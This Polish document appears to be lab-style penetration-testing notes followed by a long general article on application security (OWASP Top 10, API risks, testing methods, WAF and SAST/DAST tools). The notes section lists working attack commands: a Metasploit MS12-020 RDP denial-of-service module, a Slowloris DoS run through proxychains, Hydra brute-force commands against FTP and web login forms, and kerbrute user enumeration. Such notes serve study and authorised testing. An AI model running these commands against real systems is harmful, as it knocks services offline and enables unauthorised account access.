Co to jest AD (Active Directory)?
Active Directory obsługuje szereg funkcji, takich jak uwierzytelnianie, zarządzanie grupami i użytkownikami, administrowanie zasadami i wiele innych.
AD może wykorzystywać zarówno protokół Kerberos, jak i LDAP do uwierzytelniania, co czyni go obecnie najczęściej używaną usługą katalogową.

**NMAP**:
* * *-sV do włączenia wykrywania wersji
* * *-sC do uruchamiania z domyślnymi skryptami NSE
* * *-A dla włączenia trybu agresywnego (włącza wykrywanie systemu operacyjnego, wykrywanie wersji, traceroute, skanowanie skryptów)
* * *-T4 do ustawienia szybkości skanowania w trybie 4
* * *-on dla zapisania wyjścia
* `sudo nmap -sV -sC -A -T4 -oN nmap.out 10.10.91.162`
* sudo nmap --open -A -O -Ss IP

LDAP jest podstawowym środkiem komunikacji między usługami katalogowymi a aplikacjami. Jeśli chodzi o konta użytkowników, usługi katalogowe przechowują informacje, takie jak nazwy, hasła i konta komputerów, i przekazują te informacje innym podmiotom sieciowym.

-----------------------------------------------------------------------------
## NARZĘDZIA
**Enum4linux -  to narzędzie do wyliczania informacji z systemów Windows i Samba.
Korzystając z tego narzędzia, możemy zidentyfikować informacje o udostępnianiu, informacje o użytkownikach i grupach użytkowników, informacje DNS, identyfikację zdalnego systemu operacyjnego, cykliczne RID, odzyskiwanie polityki haseł, informacje NetBIOS itp**

KOMENDA ` IP`

`echo "10.10.91.162 spookysec.local" | sudo tee -a /etc/hosts`  
 spooksec to nazwa domeny 10.10 to adres ip atakowanej maszyny reszta komendy to dodanie tej "strony" do /etc/hosts 
 
 WYSZUKIWANIE: ./kerbrute userenum --dc domena-z-nmap-domain-name -d domena-z-nmap-domain-name userlist.txt

Manipulacja bitami to czynność polegająca na manipulowaniu bitami w celu wykrycia błędów (kodu Hamminga), szyfrowania i odszyfrowywania wiadomości

przydatne - https://github.com/foobarto/redteam-notebook
 
 https://github.com/paulsec/awesome-sec-talks

--------------------------------------------------------------------------------------------------
METASPLOIT

CVE-2012-0002 Exploit - 
`use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
`RHOST IP CELU`
`run`
-----------------------------------------------------------------------------
sudo nmap 10.10.171.213 --script vuln

Powolny atak Loris:
`cd PySlowLoris`
`proxychains python3 src/main.py IP:443`

HYDRA:
hydra -l username -P sql.txt ftp://IP

Możemy również użyć Hydry do bruteforce formularzy internetowych, musisz upewnić się, że wiesz, jakiego typu żądania są tworzone - zwykle używane są metody GET lub POST. Możesz użyć karty sieci przeglądarki (w narzędziach programistycznych), aby zobaczyć typy żądań lub po prostu wyświetlić kod źródłowy.

Poniżej znajduje się przykładowe polecenie Hydra do brutalnego wymuszenia formularza logowania POST:

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

Co to jest bezpieczeństwo aplikacji?
Bezpieczeństwo aplikacji ma na celu ochronę kodu aplikacji i danych przed zagrożeniami cybernetycznymi. Możesz i powinieneś stosować zabezpieczenia aplikacji we wszystkich fazach rozwoju, w tym projektowania, programowania i wdrażania.

Oto kilka sposobów promowania bezpieczeństwa aplikacji w całym cyklu rozwoju oprogramowania (SDLC):

Wprowadzaj standardy i narzędzia bezpieczeństwa na etapie projektowania i tworzenia aplikacji. Na przykład uwzględnij skanowanie podatności na wczesnym etapie rozwoju.
Implementuj procedury i systemy bezpieczeństwa w celu ochrony aplikacji w środowiskach produkcyjnych. Na przykład wykonuj ciągłe testy bezpieczeństwa.
Zaimplementuj silne uwierzytelnianie dla aplikacji, które zawierają poufne dane lub mają krytyczne znaczenie.
Korzystaj z systemów bezpieczeństwa, takich jak zapory, zapory aplikacji internetowych (WAF) i systemy zapobiegania włamaniom (IPS).
Jakie typy aplikacji musi zabezpieczyć nowoczesna organizacja?
Bezpieczeństwo aplikacji internetowych
Aplikacja internetowa to oprogramowanie działające na serwerze sieciowym i dostępne przez Internet. Klient działa w przeglądarce internetowej. Z natury aplikacje muszą akceptować połączenia od klientów przez niezabezpieczone sieci . Naraża to ich na szereg luk w zabezpieczeniach. Wiele aplikacji internetowych ma kluczowe znaczenie dla działalności biznesowej i zawiera wrażliwe dane klientów, co czyni je cennym celem dla atakujących i ma wysoki priorytet dla każdego programu bezpieczeństwa cybernetycznego .

Ewolucja Internetu zajęła się pewnymi lukami w aplikacjach internetowych – takimi jak wprowadzenie protokołu HTTPS, który tworzy zaszyfrowany kanał komunikacyjny, który chroni przed atakami typu „man in the middle” (MitM). Pozostało jednak wiele luk w zabezpieczeniach. Najpoważniejsze i najczęstsze luki w zabezpieczeniach są udokumentowane przez Open Web Application Security Project (OWASP) w formie OWASP Top 10.

Ze względu na narastający problem bezpieczeństwa aplikacji internetowych, wielu producentów zabezpieczeń wprowadziło rozwiązania zaprojektowane specjalnie do zabezpieczania aplikacji internetowych. Przykładem może być zapora aplikacji internetowej (WAF), narzędzie zabezpieczające zaprojektowane do wykrywania i blokowania ataków w warstwie aplikacji.

Dowiedz się więcej w naszym szczegółowym przewodniku po bezpieczeństwie stron internetowych

Bezpieczeństwo API
Coraz większe znaczenie mają interfejsy programowania aplikacji (API). Stanowią one podstawę nowoczesnych aplikacji mikroserwisowych i powstała cała ekonomia API, która pozwala organizacjom na współdzielenie danych i dostęp do funkcjonalności oprogramowania stworzonego przez innych. Oznacza to, że bezpieczeństwo API ma kluczowe znaczenie dla nowoczesnych organizacji.

API, które cierpią z powodu luk w zabezpieczeniach , są przyczyną poważnych naruszeń bezpieczeństwa danych . Mogą ujawnić wrażliwe dane i spowodować zakłócenia w krytycznych operacjach biznesowych. Częstymi słabościami zabezpieczeń interfejsów API są słabe uwierzytelnianie, niechciane narażenie danych i brak ograniczenia szybkości, co umożliwia nadużycia interfejsu API.

Podobnie jak bezpieczeństwo aplikacji internetowych, potrzeba bezpieczeństwa API doprowadziła do rozwoju wyspecjalizowanych narzędzi, które mogą identyfikować luki w API i zabezpieczać API w środowisku produkcyjnym.

Dowiedz się więcej ze szczegółowego przewodnika po zabezpieczeniach API

Bezpieczeństwo aplikacji natywnych w chmurze
Aplikacje natywne dla chmury to aplikacje zbudowane w architekturze mikrousług przy użyciu technologii takich jak maszyny wirtualne, kontenery i platformy bezserwerowe. Zabezpieczenia natywne w chmurze to złożone wyzwanie, ponieważ aplikacje natywne dla chmury mają dużą liczbę ruchomych części i komponentów, które mają tendencję do bycia efemerycznych — często rozbieranych i zastępowanych przez inne. Utrudnia to uzyskanie wglądu w natywne środowisko chmury i zapewnienie bezpieczeństwa wszystkich komponentów.

W aplikacjach natywnych dla chmury infrastruktura i środowiska są zazwyczaj konfigurowane automatycznie w oparciu o konfigurację deklaratywną — nazywa się to infrastrukturą jako kodem (IaC). Deweloperzy są odpowiedzialni za tworzenie konfiguracji deklaratywnych i kodu aplikacji, a oba te elementy powinny podlegać względom bezpieczeństwa. Przesunięcie w lewo jest znacznie ważniejsze w środowiskach natywnych dla chmury, ponieważ prawie wszystko jest ustalane na etapie rozwoju.

Aplikacje natywne dla chmury mogą korzystać z tradycyjnych narzędzi testowych, ale te narzędzia nie wystarczą. Potrzebne są dedykowane narzędzia bezpieczeństwa natywne dla chmury, które są w stanie oprzyrządować kontenery, klastry kontenerów i funkcje bezserwerowe, zgłaszać problemy z bezpieczeństwem i zapewniać szybką pętlę informacji zwrotnych dla programistów.

Innym ważnym aspektem bezpieczeństwa natywnego w chmurze jest automatyczne skanowanie wszystkich artefaktów na wszystkich etapach cyklu rozwoju. Co najważniejsze, organizacje muszą skanować obrazy kontenerów na wszystkich etapach procesu rozwoju.

Dowiedz się więcej w szczegółowych przewodnikach do:

Architektura kontenerowa
Architektura bezserwerowa
Zagrożenia bezpieczeństwa aplikacji
Zagrożenia bezpieczeństwa aplikacji internetowych: OWASP Top 10
Aplikacje mogą być narażone na wiele zagrożeń. Lista Top 10 Open Web Application Security Project (OWASP) zawiera krytyczne zagrożenia aplikacji, które najprawdopodobniej wpłyną na aplikacje w środowisku produkcyjnym.

Uszkodzona kontrola dostępu
Uszkodzona kontrola dostępu umożliwia zagrożeniom i użytkownikom uzyskanie nieautoryzowanego dostępu i uprawnień. Oto najczęstsze problemy:

Umożliwia atakującym uzyskanie nieautoryzowanego dostępu do kont użytkowników i działanie jako administratorzy lub zwykli użytkownicy.
Zapewnia użytkownikom nieautoryzowane funkcje uprzywilejowane.
Możesz rozwiązać ten problem, wdrażając silne mechanizmy dostępu, które zapewniają, że każda rola jest jasno zdefiniowana z izolowanymi uprawnieniami.

Błędy kryptograficzne
Awarie kryptograficzne (wcześniej określane jako „narażenie danych wrażliwych”) występują, gdy dane nie są odpowiednio chronione podczas przesyłania i przechowywania. Może ujawniać hasła, dokumentację medyczną, numery kart kredytowych i dane osobowe.

To zagrożenie bezpieczeństwa aplikacji może prowadzić do nieprzestrzegania przepisów dotyczących prywatności danych, takich jak Ogólne rozporządzenie o ochronie danych UE (RODO) oraz standardów finansowych, takich jak PCI Data Security Standards (PCI DSS).

Wstrzyknięcie (w tym XSS, LFI i wstrzyknięcie SQL)
Luki w zabezpieczeniach wstrzykiwane umożliwiają cyberprzestępcom wysyłanie złośliwych danych do interpretera aplikacji internetowych. Może to spowodować kompilację i wykonanie tych danych na serwerze. Wstrzykiwanie SQL jest powszechną formą wstrzykiwania .

Dowiedz się więcej w szczegółowych przewodnikach do:

Skrypty między witrynami (XSS)
Wstrzykiwanie pliku lokalnego (LFI)
Wstrzyknięcie SQL (SQLi)
Fałszowanie żądań między witrynami (CSRF)
Niepewny projekt
Niepewny projekt obejmuje wiele słabości aplikacji, które występują z powodu nieskutecznych lub brakujących kontroli bezpieczeństwa. Aplikacje, które nie mają podstawowych mechanizmów kontroli bezpieczeństwa, które są w stanie stawić czoła krytycznym zagrożeniom. Chociaż można naprawić wady implementacji w aplikacjach z bezpiecznym projektem, nie jest możliwe naprawienie niezabezpieczonego projektu za pomocą odpowiedniej konfiguracji lub środków zaradczych.

Błędna konfiguracja zabezpieczeń (w tym XXE)
Błędy w konfiguracji zabezpieczeń występują z powodu braku wzmocnienia zabezpieczeń w stosie aplikacji. Oto typowe błędy konfiguracji zabezpieczeń:

Nieprawidłowa konfiguracja uprawnień do usług w chmurze
Pozostawienie włączonych lub zainstalowanych niepotrzebnych funkcji
Korzystanie z domyślnych haseł lub kont administratora
Luki w zabezpieczeniach zewnętrznych jednostek XML (XXE)
Dowiedz się więcej ze szczegółowego przewodnika po zewnętrznych jednostkach XML (XXE)

Podatne i przestarzałe komponenty
Podatne i nieaktualne składniki (wcześniej określane jako „używające składników ze znanymi lukami”) obejmują wszelkie luki wynikające z nieaktualnego lub nieobsługiwanego oprogramowania. Może wystąpić, gdy tworzysz lub używasz aplikacji bez wcześniejszej znajomości jej wewnętrznych składników i wersji.

Błędy identyfikacji i uwierzytelniania
Błędy identyfikacji i uwierzytelniania (wcześniej określane jako „uszkodzone uwierzytelnianie”) obejmują wszelkie problemy z bezpieczeństwem związane z tożsamościami użytkowników. Możesz chronić się przed atakami na tożsamość i exploitami, ustanawiając bezpieczne zarządzanie sesjami oraz konfigurując uwierzytelnianie i weryfikację dla wszystkich tożsamości.

Awarie oprogramowania i integralności danych
Awarie oprogramowania i integralności danych występują, gdy infrastruktura i kod są podatne na naruszenia integralności. Może wystąpić podczas aktualizacji oprogramowania, modyfikacji poufnych danych i wszelkich zmian potoku CI/CD, które nie zostały zweryfikowane. Niezabezpieczone potoki CI/CD mogą skutkować nieautoryzowanym dostępem i prowadzić do ataków w łańcuchu dostaw.

Rejestrowanie bezpieczeństwa i monitorowanie awarii
Awarie rejestrowania i monitorowania zabezpieczeń (wcześniej określane jako „niewystarczające rejestrowanie i monitorowanie”) występują, gdy słabości aplikacji nie mogą prawidłowo wykryć zagrożeń bezpieczeństwa i na nie reagować. Logowanie i monitorowanie mają kluczowe znaczenie dla wykrywania naruszeń. Gdy te mechanizmy nie działają, utrudnia to widoczność aplikacji oraz zagraża alarmom i informacjom śledczym.

Fałszerstwo żądania po stronie serwera
Luki w zabezpieczeniach związane z fałszowaniem żądań po stronie serwera (SSRF) występują, gdy aplikacja sieci Web nie sprawdza poprawności adresu URL wprowadzonego przez użytkownika przed pobraniem danych ze zdalnego zasobu. Może mieć wpływ na serwery chronione zaporą ogniową i dowolną listę kontroli dostępu do sieci (ACL), która nie weryfikuje adresów URL.

Dowiedz się więcej w szczegółowym przewodniku po SSRF

Dowiedz się o dodatkowych zagrożeniach cybernetycznych z naszego przewodnika po cyberatakach

Zagrożenia bezpieczeństwa API: OWASP Top 10
Interfejsy API umożliwiają komunikację między różnymi częściami oprogramowania. Aplikacje z interfejsami API umożliwiają zewnętrznym klientom żądanie usług z aplikacji. Interfejsy API są narażone na różne zagrożenia i luki w zabezpieczeniach. OWASP skompilował listę, w której określono priorytety 10 najważniejszych zagrożeń bezpieczeństwa API.

Autoryzacja na poziomie uszkodzonych obiektów
Interfejsy API często ujawniają punkty końcowe obsługujące identyfikatory obiektów. Tworzy to szerszą powierzchnię ataku, problem kontroli dostępu na poziomie. Zamiast tego należy sprawdzić autoryzację na poziomie obiektu w każdej funkcji, która może uzyskać dostęp do źródła danych za pośrednictwem danych wejściowych użytkownika.

Uszkodzone uwierzytelnianie użytkownika
Nieprawidłowo zaimplementowane mechanizmy uwierzytelniania mogą zapewnić nieautoryzowany dostęp złośliwym podmiotom. Umożliwia atakującym wykorzystanie luki w implementacji lub złamanie zabezpieczeń tokenów uwierzytelniania . Gdy to nastąpi, osoby atakujące mogą na stałe lub tymczasowo przyjąć legalną tożsamość użytkownika. W rezultacie zdolność systemu do identyfikacji klienta lub użytkownika jest zagrożona, co zagraża ogólnemu bezpieczeństwu API aplikacji.

Nadmierna ekspozycja na dane
Implementacje ogólne często prowadzą do ujawnienia wszystkich właściwości obiektu bez uwzględniania indywidualnej wrażliwości każdego obiektu. Występuje, gdy programiści polegają na klientach w celu filtrowania danych przed wyświetleniem informacji użytkownikowi.

Brak zasobów i ograniczenie szybkości
Interfejsy API zwykle nie nakładają ograniczeń na liczbę lub rozmiar zasobów, o które może poprosić klient lub użytkownik. Jednak ten problem może wpłynąć na wydajność serwera API i spowodować odmowę usługi (DoS). Dodatkowo może tworzyć luki w uwierzytelnianiu, które umożliwiają ataki typu brute force.

Autoryzacja złamanego poziomu funkcji
Luki autoryzacji umożliwiają atakującym uzyskanie nieautoryzowanego dostępu do zasobów legalnych użytkowników lub uzyskanie uprawnień administracyjnych. Może wystąpić w wyniku nadmiernie skomplikowanych polityk kontroli dostępu opartych na różnych hierarchiach, rolach, grupach oraz niejasnym rozdzieleniu funkcji zwykłych i administracyjnych.

Zadanie masowe
Przypisanie masowe jest zwykle wynikiem nieprawidłowego powiązania danych dostarczonych przez klientów, takich jak JSON, z modelami danych. Występuje, gdy wiązanie odbywa się bez użycia filtrowania właściwości na podstawie listy dozwolonych. Umożliwia atakującym odgadnięcie właściwości obiektu, przeczytanie dokumentacji, zbadanie innych punktów końcowych interfejsu API lub dostarczenie dodatkowych właściwości obiektu w celu żądania ładunku.

Błędna konfiguracja zabezpieczeń
Błędna konfiguracja zabezpieczeń zwykle występuje z powodu:

Niebezpieczne konfiguracje domyślne
Otwórz magazyn w chmurze
Konfiguracje ad hoc lub niekompletne
Błędnie skonfigurowane nagłówki HTTP
Permisywne udostępnianie zasobów między źródłami (CORS)
Niepotrzebne metody HTTP
Szczegółowe komunikaty o błędach zawierające poufne informacje
Zastrzyk
Błędy wstrzykiwania, takie jak wstrzykiwanie poleceń, wstrzykiwanie SQL i wstrzykiwanie NoSQL, występują, gdy zapytanie lub polecenie wysyła niezaufane dane do interpretera. Są to zazwyczaj złośliwe dane, które próbują nakłonić tłumacza do zapewnienia nieautoryzowanego dostępu do danych lub wykonania niezamierzonych poleceń.

Niewłaściwe zarządzanie aktywami
Interfejsy API zwykle udostępniają więcej punktów końcowych niż tradycyjne aplikacje internetowe. Ten charakter interfejsów API oznacza, że ​​właściwa i zaktualizowana dokumentacja staje się kluczowa dla bezpieczeństwa. Ponadto odpowiedni wykaz hostów i wdrożonych wersji interfejsu API może pomóc złagodzić problemy związane z ujawnionymi punktami końcowymi debugowania i przestarzałymi wersjami interfejsu API.

Niewystarczające rejestrowanie i monitorowanie
Niewystarczające rejestrowanie i monitorowanie umożliwia cyberprzestępcom eskalację swoich ataków, zwłaszcza gdy nie ma skutecznej integracji z reagowaniem na incydent lub nie jest ona zintegrowana . Umożliwia złośliwym podmiotom zachowanie trwałości i przechodzenie do innych systemów, w których wydobywają, niszczą lub manipulują danymi.

Co to jest testowanie bezpieczeństwa aplikacji?
Testowanie bezpieczeństwa aplikacji (AST) to proces zwiększania odporności aplikacji na zagrożenia bezpieczeństwa poprzez identyfikowanie i usuwanie luk w zabezpieczeniach.

Początkowo AST był procesem ręcznym. W nowoczesnych, szybkich procesach rozwoju AST musi być zautomatyzowany. Zwiększona modułowość oprogramowania dla przedsiębiorstw, liczne komponenty open source oraz duża liczba znanych luk w zabezpieczeniach i wektorów zagrożeń sprawiają, że automatyzacja jest niezbędna. Większość organizacji używa kombinacji narzędzi bezpieczeństwa aplikacji do prowadzenia AST.

Kluczowe uwagi przed testowaniem aplikacji

Oto kluczowe kwestie, które należy wziąć pod uwagę, zanim będzie można prawidłowo przetestować aplikacje pod kątem luk w zabezpieczeniach:

Utwórz kompletny spis swoich aplikacji.
Poznaj zastosowania biznesowe, wpływ i wrażliwość swoich aplikacji.
Określ, które aplikacje chcesz przetestować — zacznij od systemów dostępnych publicznie, takich jak aplikacje internetowe i mobilne.
Jak testować

Aby pomyślnie przetestować aplikacje pod kątem luk w zabezpieczeniach, musisz określić następujące parametry:

Testowanie uwierzytelnione a testowanie nieuwierzytelnione — można testować aplikacje z perspektywy osoby postronnej (podejście typu „czarna skrzynka”). Jednak przeprowadzanie uwierzytelnionych testów ma dużą wartość, aby wykryć problemy z bezpieczeństwem, które mają wpływ na uwierzytelnionych użytkowników. Może to pomóc w wykryciu luk w zabezpieczeniach, takich jak wstrzykiwanie SQL i manipulacja sesją.
Które narzędzia należy użyć — testowanie powinno w idealnym przypadku obejmować narzędzia, które mogą identyfikować luki w kodzie źródłowym, narzędzia, które mogą testować aplikacje pod kątem słabych punktów bezpieczeństwa w czasie wykonywania, oraz skanery luk w zabezpieczeniach sieci.
Testowanie produkcji a etapowanie — testowanie w środowisku produkcyjnym jest ważne, ponieważ pozwala zidentyfikować problemy z bezpieczeństwem, które obecnie zagrażają organizacji i jej klientom. Jednak testowanie produkcyjne może mieć wpływ na wydajność. Testowanie w stagingu jest łatwiejsze do osiągnięcia i pozwala na szybszą naprawę luk w zabezpieczeniach.
Niezależnie od tego, czy wyłączyć systemy bezpieczeństwa podczas testowania — w przypadku większości testów bezpieczeństwa dobrym pomysłem jest wyłączenie zapór ogniowych, zapór sieciowych aplikacji internetowych (WAF) i systemów zapobiegania włamaniom (IPS) lub przynajmniej dodanie adresów IP narzędzi testowych do białej listy, w przeciwnym razie narzędzia mogą zakłócać skanowanie. Jednak w pełnym teście penetracyjnym narzędzia należy pozostawić włączone, a celem jest skanowanie aplikacji bez wykrycia.
Kiedy testować — zazwyczaj zaleca się przeprowadzanie testów bezpieczeństwa w okresach wyłączenia, aby uniknąć wpływu na wydajność i niezawodność aplikacji produkcyjnych.
Co raportować — wiele narzędzi bezpieczeństwa dostarcza bardzo szczegółowe raporty dotyczące ich określonej domeny testowej, a raporty te nie są przeznaczone do użytku przez ekspertów spoza dziedziny bezpieczeństwa. Zespoły ds. bezpieczeństwa powinny wydobywać najistotniejsze spostrzeżenia z automatycznych raportów i przedstawiać je w znaczący sposób zainteresowanym stronom.
Testy walidacyjne — krytyczną częścią testów bezpieczeństwa jest sprawdzenie, czy działania naprawcze zostały wykonane pomyślnie. Deweloper nie wystarczy, aby powiedział, że naprawa została naprawiona. Musisz ponownie przeprowadzić test i upewnić się, że usterka już nie istnieje, lub w inny sposób przekazać opinię programistom.
Dowiedz się więcej ze szczegółowego przewodnika po:

Testy bezpieczeństwa
Zarządzanie zależnościami
Cykl życia oprogramowania (SDLC)
Rodzaje testów bezpieczeństwa aplikacji
Istnieją trzy główne typy testów bezpieczeństwa aplikacji:

Testowanie bezpieczeństwa czarnej skrzynki
W teście czarnej skrzynki system testujący nie ma dostępu do wnętrza testowanego systemu. To jest perspektywa atakującego z zewnątrz. Narzędzie testujące lub człowiek testujący musi przeprowadzić rozpoznanie w celu zidentyfikowania testowanych systemów i wykrycia luk w zabezpieczeniach. Testowanie czarnoskrzynkowe jest bardzo cenne, ale niewystarczające, ponieważ nie może przetestować podstawowych słabości zabezpieczeń aplikacji.

Dowiedz się więcej ze szczegółowego przewodnika po testach czarnoskrzynkowych

Testowanie bezpieczeństwa białej skrzynki
W teście białej skrzynki system testujący ma pełny dostęp do wnętrza testowanej aplikacji. Klasycznym przykładem jest statyczna analiza kodu, w której narzędzie testujące ma bezpośredni dostęp do kodu źródłowego aplikacji. Testowanie białej skrzynki może zidentyfikować luki w logice biznesowej, problemy z jakością kodu, błędne konfiguracje zabezpieczeń i niebezpieczne praktyki kodowania. Testowanie białoskrzynkowe może również obejmować testowanie dynamiczne, które wykorzystuje techniki fuzzingu do sprawdzania różnych ścieżek w aplikacji i wykrywania nieoczekiwanych luk w zabezpieczeniach. Wadą podejścia białoskrzynkowego jest to, że nie wszystkie te luki będą w rzeczywistości możliwe do wykorzystania w środowiskach produkcyjnych.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu białej skrzynki

Testy bezpieczeństwa szarej skrzynki
W teście szarej skrzynki system testujący ma dostęp do ograniczonych informacji na temat elementów wewnętrznych testowanej aplikacji. Na przykład tester może otrzymać poświadczenia logowania, aby mógł przetestować aplikację z perspektywy zalogowanego użytkownika. Testowanie szarej skrzynki może pomóc w zrozumieniu, jaki poziom dostępu mają uprzywilejowani użytkownicy oraz jaki poziom szkód mogliby wyrządzić w przypadku włamania na konto. Testy szarej skrzynki mogą symulować zagrożenia wewnętrzne lub napastników, którzy już naruszyli granicę sieci. Testowanie szarej skrzynki jest uważane za wysoce wydajne, zachowując równowagę między podejściem czarnej i białej skrzynki.

Dowiedz się więcej ze szczegółowego przewodnika po testach szarej skrzynki

Narzędzia i rozwiązania bezpieczeństwa aplikacji
Zapora aplikacji internetowej (WAF)
WAF monitoruje i filtruje ruch HTTP, który przechodzi między aplikacją internetową a Internetem. Technologia WAF nie obejmuje wszystkich zagrożeń, ale może współpracować z pakietem narzędzi zabezpieczających w celu stworzenia całościowej ochrony przed różnymi wektorami ataków.

W modelu połączeń systemów otwartych (OSI), WAF służy jako ochrona warstwy protokołu siódmej, która pomaga chronić aplikacje internetowe przed atakami, takimi jak cross-site scripting (XSS), cross-site forgering, SQL injection i inkluzja plików .

W przeciwieństwie do serwera proxy, który chroni tożsamość komputerów klienckich przez pośrednika, WAF działa jak odwrotny serwer proxy, który chroni serwer przed ujawnieniem. WAF służy jako tarcza, która stoi przed aplikacją internetową i chroni ją przed Internetem — klienci przechodzą przez WAF, zanim dotrą do serwera.

Dowiedz się więcej o zaporze aplikacji internetowej Imperva

Samoochrona aplikacji w czasie wykonywania (RASP)
Technologia RASP może analizować zachowanie użytkownika i ruch aplikacji w czasie wykonywania. Jego celem jest pomoc w wykrywaniu i zapobieganiu cyberzagrożeniom poprzez uzyskanie wglądu w kod źródłowy aplikacji oraz analizę słabych punktów i słabych punktów.

Narzędzia RASP mogą identyfikować luki w zabezpieczeniach, które zostały już wykorzystane, przerywać te sesje i generować alerty w celu zapewnienia aktywnej ochrony.

Dowiedz się więcej o samoochronie aplikacji Imperva Runtime

Analiza składu oprogramowania (SCA)
Narzędzia SCA tworzą spis komponentów open source i komercyjnych innych firm używanych w oprogramowaniu. Pomaga dowiedzieć się, które składniki i wersje są aktywnie używane, oraz zidentyfikować poważne luki w zabezpieczeniach mające wpływ na te składniki.

Organizacje używają narzędzi SCA do znajdowania składników innych firm, które mogą zawierać luki w zabezpieczeniach.

Dowiedz się więcej o analizie składu oprogramowania (SCA)

Statyczne testowanie bezpieczeństwa aplikacji (SAST)
Narzędzia SAST pomagają testerom białych skrzynek w sprawdzaniu wewnętrznego działania aplikacji. Obejmuje sprawdzanie statycznego kodu źródłowego i raportowanie o zidentyfikowanych słabościach bezpieczeństwa.

SAST może pomóc znaleźć problemy, takie jak błędy składni, problemy z walidacją danych wejściowych, nieprawidłowe lub niezabezpieczone odwołania lub błędy matematyczne w nieskompilowanym kodzie. Możesz użyć analizatorów binarnych i kodu bajtowego, aby zastosować SAST do skompilowanego kodu.

Dowiedz się więcej o SAST

Dynamiczne testowanie bezpieczeństwa aplikacji (DAST)
Narzędzia DAST pomagają testerom czarnoskrzynkowym w wykonywaniu kodu i sprawdzaniu go w czasie wykonywania. Pomaga wykryć problemy, które mogą stanowić luki w zabezpieczeniach. Organizacje używają DAST do przeprowadzania skanowań na dużą skalę, które symulują wiele złośliwych lub nieoczekiwanych przypadków testowych. Testy te dostarczają raporty dotyczące odpowiedzi aplikacji.

DAST może pomóc zidentyfikować problemy, takie jak ciągi zapytań, użycie skryptów, żądań i odpowiedzi, wyciek pamięci, uwierzytelnianie, obsługa plików cookie i sesji, wykonywanie komponentów innych firm, wstrzykiwanie DOM i wstrzykiwanie danych.

Dowiedz się więcej o DAST

Interaktywne testowanie bezpieczeństwa aplikacji (IAST)
Narzędzia IAST wykorzystują techniki i narzędzia SAST i DAST do wykrywania szerszego zakresu problemów związanych z bezpieczeństwem. Narzędzia te działają dynamicznie, aby kontrolować oprogramowanie w czasie wykonywania. Inspekcja skompilowanego kodu źródłowego odbywa się z poziomu serwera aplikacji.

Narzędzia IAST mogą ułatwić naprawę, dostarczając informacji o pierwotnej przyczynie luk w zabezpieczeniach i identyfikując określone wiersze kodu, którego dotyczy problem. Narzędzia te mogą analizować przepływ danych, kod źródłowy, konfigurację i biblioteki innych firm. Możesz także użyć narzędzi IAST do testowania API.

Dowiedz się więcej o IAST

Testowanie bezpieczeństwa aplikacji mobilnych (MAST)
Narzędzia MAST wykorzystują różne techniki do testowania bezpieczeństwa aplikacji mobilnych. Polega na wykorzystaniu analizy statycznej i dynamicznej oraz badaniu danych kryminalistycznych gromadzonych przez aplikacje mobilne.

Organizacje używają narzędzi MAST do sprawdzania luk w zabezpieczeniach i problemów specyficznych dla urządzeń mobilnych, takich jak jailbreak, wyciek danych z urządzeń mobilnych i złośliwe sieci Wi-Fi.

CNAPP
Platforma ochrony aplikacji natywnych w chmurze (CNAPP) zapewnia scentralizowany panel sterowania dla narzędzi wymaganych do ochrony aplikacji natywnych w chmurze. Łączy platformę ochrony obciążeń w chmurze (CWPP) i zarządzanie stanem bezpieczeństwa w chmurze (CSPM) z innymi funkcjami.

Technologia CNAPP często obejmuje zarządzanie uprawnieniami tożsamości, wykrywanie i ochronę API oraz automatyzację i bezpieczeństwo orkiestracji dla platform orkiestracji kontenerów, takich jak Kubernetes.

Najlepsze praktyki dotyczące bezpieczeństwa aplikacji
Oto kilka najlepszych praktyk, które mogą pomóc w efektywniejszym ćwiczeniu bezpieczeństwa aplikacji.

Wykonaj ocenę zagrożenia
Posiadanie listy wrażliwych zasobów, które należy chronić, może pomóc w zrozumieniu zagrożeń, przed jakimi stoi Twoja organizacja, i sposobów ich łagodzenia. Zastanów się, jakich metod haker może użyć do złamania zabezpieczeń aplikacji, czy są stosowane istniejące środki bezpieczeństwa i czy potrzebujesz dodatkowych narzędzi lub środków ochronnych.

Ważne jest również, aby realistycznie podchodzić do swoich oczekiwań w zakresie bezpieczeństwa. Nawet przy najwyższym poziomie ochrony nie ma rzeczy niemożliwych do zhakowania. Musisz także szczerze powiedzieć, co Twój zespół może wytrzymać w dłuższej perspektywie. Jeśli będziesz naciskać zbyt mocno, standardy i praktyki bezpieczeństwa mogą zostać zignorowane. Pamiętaj, że bezpieczeństwo to przedsięwzięcie długoterminowe i potrzebujesz współpracy innych pracowników oraz swoich klientów.

Przesuń zabezpieczenia w lewo
Firmy przechodzą z rocznych wydań produktów na wydania miesięczne, tygodniowe lub dzienne. Aby dostosować się do tej zmiany, testowanie bezpieczeństwa musi być częścią cyklu rozwoju, a nie dodane po namyśle. W ten sposób testy bezpieczeństwa nie przeszkadzają w wydawaniu produktu.

Dobrym pierwszym krokiem przed wprowadzeniem tych zmian jest pomoc pracownikom ds. bezpieczeństwa w zrozumieniu procesów programistycznych i budowaniu relacji między zespołami ds. bezpieczeństwa i programistów. Pracownicy ds. bezpieczeństwa muszą nauczyć się narzędzi i procesów używanych przez programistów, aby mogli organicznie zintegrować zabezpieczenia. Gdy zabezpieczenia są płynnie zintegrowane z procesem rozwoju, programiści chętniej je stosują i budują zaufanie.

Musisz także znaleźć sposób na zautomatyzowanie testowania bezpieczeństwa dla potoków CI/CD. Integracja zautomatyzowanych narzędzi bezpieczeństwa z potokiem CI/CD pozwala programistom na szybkie naprawienie problemów w krótkim czasie po wprowadzeniu odpowiednich zmian.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu przesunięcia w lewo

Nadaj priorytet swoim operacjom naprawczym
Luki w zabezpieczeniach są coraz większe, a deweloperom trudno jest rozwiązać wszystkie problemy. Biorąc pod uwagę skalę zadania, priorytetyzacja ma kluczowe znaczenie dla zespołów, które chcą zapewnić bezpieczeństwo aplikacji.

